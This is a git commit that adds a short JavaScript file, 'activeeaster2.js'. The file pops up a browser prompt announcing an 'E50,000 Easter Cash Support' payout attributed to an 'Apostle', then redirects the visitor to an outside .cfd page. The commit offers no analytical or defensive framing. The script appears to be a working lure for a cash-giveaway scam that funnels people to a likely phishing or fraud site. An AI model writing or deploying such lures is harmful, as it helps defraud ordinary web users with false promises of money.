459db718b12efd3f0c40a688ef43ae2a7aab4f3c
Help-All <imaobongumoh637@gmail.com>
2026-04-02 16:49:11 +0100

    Create activeeaster2.js

---
+++ activeeaster2.js
@@ -0,0 +1,10 @@
+var password = 'E50,000';
+
+password = prompt(
+  'Congratulations, you are eligible to Receive APOSTLE JUSTICE DLAMINI E50,000 Easter Cash Support. Click OK to receive Instantly.',
+  'E50,000'
+);
+
+if (password !== 'E50,000') {
+    location.href = 'https://getin-ofer.cfd/50000-Lusito-lwemali.html';
+}
